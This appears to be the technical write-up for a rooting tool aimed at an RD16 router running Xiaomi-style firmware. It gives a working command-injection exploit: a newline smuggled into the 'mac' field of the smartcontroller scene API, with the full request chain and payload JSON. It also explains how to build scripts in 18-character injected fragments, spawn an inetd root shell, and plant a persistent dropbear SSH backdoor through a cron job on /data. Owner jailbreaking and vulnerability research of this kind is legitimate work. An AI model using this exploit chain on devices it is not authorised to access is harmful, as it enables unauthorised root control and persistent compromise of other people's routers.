# Technical details

## Injection point

`/usr/sbin/smartcontroller` splices `mac` and `wan` from the action payload (a JSON string) straight into:

```
snprintf(buf, "… set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit", mac, wan)
system(buf)
```

No escaping on `mac` → newline = command injection. The fortify `snprintf` bound leaves ≈18 characters of usable command after the fixed template text.

## Call chain

```
POST /cgi-bin/luci/api/xqsystem/login        -> token
POST /cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller
    {"command":"scene_setting","id":0,"launch":{"mode":"home"},
     "action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,
                     "payload":"{\"command\":\"wan_block\",\"mac\":\"AA\n<CMD>\n\"}"}]}
    -> daemon stores the scene, returns id
POST same endpoint {"command":"scene_start","id":<id>} -> executes
POST same endpoint {"command":"scene_delete","id":<id>} -> removes the scene (required: scene_setting persists a record into /etc/smartcontroller/SmartTask.sc on the ~6 MB sec_cfg partition; repeated runs fill it. Wipe everything with reset_scenes)
```

`payload` is a **string-typed** inner JSON object (double-escaped). The login body is form-encoded field by field so `&` / `+` in the password survive.

## Why bare telnetd fails

busybox carries `bdata get telnet_en` / `nvram get telnet_en` checks — `telnetd` exits immediately and never binds. The official `set_telnet` API is gated behind the `apps.telnet` feature flag (not registered on release builds). inetd skips the check and hands out `/bin/sh` — but it is a **debug-only** channel and is removed once SSH is up (below).

## Append-fragment writer

Every injected command is ≤18 chars and appends straight to the target file — unbounded script length, and no assembly step that could overflow:

- non-space frag (≤2 chars): `echo -n FF>>/tmp/x` (18)
- 3-char group containing a space `A B`: `echo -n A B>/tmp/0` + `cat /tmp/0>>/tmp/x` (two cmds, 18 each) — the space comes from echo's argv splitting
- line-final frag: plain `echo` (`echo A D >>/tmp/x`, 17-18) supplying the newline
- all-digit args directly before `>`/`>>` parse as fd redirection (`2>`, `2>>`) — pad with `D >>`; mixed args (`aa2`) are immune because io_number only matches whole-word digits
- `space+digit` (`A D`) mid-line has no legal ≤18-char emission — the writer raises `ValueError`; `>` can never appear inside content

`run_cmd()` hard-checks every command for length, banned characters, and control/non-ASCII bytes; `run_checked()` verifies each injection result and aborts with the failing step number.

## SSH verification

A banner or listening port only proves something answered — not that pubkey login works. With `--privkey` the check is **bidirectional and real**:

- device side: `dropbearkey -y` exports the `/data` host key's public part into a local known_hosts file, verified with `StrictHostKeyChecking=yes`
- local side: `ssh-keygen -y` derives the pubkey from `--privkey` and compares type + blob with `--pubkey`; a mismatch refuses outright
- the ssh call uses `-F /dev/null` + `IdentitiesOnly=yes`: only the given key is offered — ssh-agent keys cannot shortcut the check

inetd is only removed when login succeeds AND host key matches AND the key pair matches. Without `--privkey`, manual confirmation gates it — **only a bare Enter counts**, any other input keeps :23.

## Firewall (--allow-cidr)

Dedicated chain `RD16_SSH` with a **windowless swap**: the full ruleset is built on `RD16_NEW` first, a top-pinned jump (`-I INPUT 1`) points at it, the old jump is removed and the old chain flushed and deleted, then `-E` renames it back — the referenced chain is never flushed in place, and the jump always lands at INPUT position 1 (`iptables -C` checks existence, not position, so the jump is forcefully re-inserted every run). The CIDR is validated by `ipaddress.ip_network` and **must be IPv4** (iptables does not handle IPv6); without the flag nothing is installed.

## Persistence model

- `/etc` = ramfs, rebuilt from squashfs at boot → runtime writes die
- `/etc/crontabs`, `/etc/config` = bind mounts onto `/dev/mapper/sec_cfg` (ext4) → persistent
- `/data` (UBIFS) → persistent; hosts the host key, `persist.sh`, `authorized_keys`
- `* * * * * sh /data/persist.sh` in `/etc/crontabs/root` self-heals within a minute of every boot
- persist.sh resurrects **dropbear only** — inetd never goes into the watchdog or onto /data
- dropbear instances are matched by `/proc/<pid>/cmdline` for our key path — an unrelated dropbear does not count as "ours is running"; a failed start goes to syslog via `logger`

## Dropbear (key auth only)

1. `rm /etc/dropbear/dropbear_rsa_host_key` (must delete the 0-byte placeholder first — `dropbearkey` refuses `File exists`)
2. `dropbearkey -y -f /data/dropbear_rsa_host_key` validates the existing key; on corruption `rm` it first, then `dropbearkey -t rsa -f` rebuilds (~1 min — RSA-2048 is slow on this SoC) — a stale file otherwise blocks keygen
3. `dropbear -s -r /data/dropbear_rsa_host_key` → key auth only; **no `-B`** (blank passwords) and no password logins
4. `authorized_keys` lives at `/etc/dropbear/authorized_keys` (runtime-effective; persist.sh restores it)
5. Cleanup: `kill` every `pidof inetd` pid + `rm /etc/inetd.conf` — only after `ssh -i <key> root@<ip> id` returns `uid=0` (a banner alone is not verification)

## Dead ends / unverified

- `nvram set telnet_en=1` / `bdata set telnet_en=1`: commands ran but `nvram show`/`bdata show` still empty — the nvram backend seems inert in lanap mode; not needed for the inetd route
- All XMiR-Patcher LuCI injection points (arn_switch/start_binding/set_mac_filter/datacenter7/Smartcontroller legacy paths/get_icon): fully patched in 1.0.41
- `set_macfilter_rules` / `set_global_enable`: no matching API route registered on RD16
- `openssl` exists on the device (`openssl passwd -1`, `enc -d -base64 -in/-out`) — usable for arbitrary binary writes (alternate dropbear hostkey path)
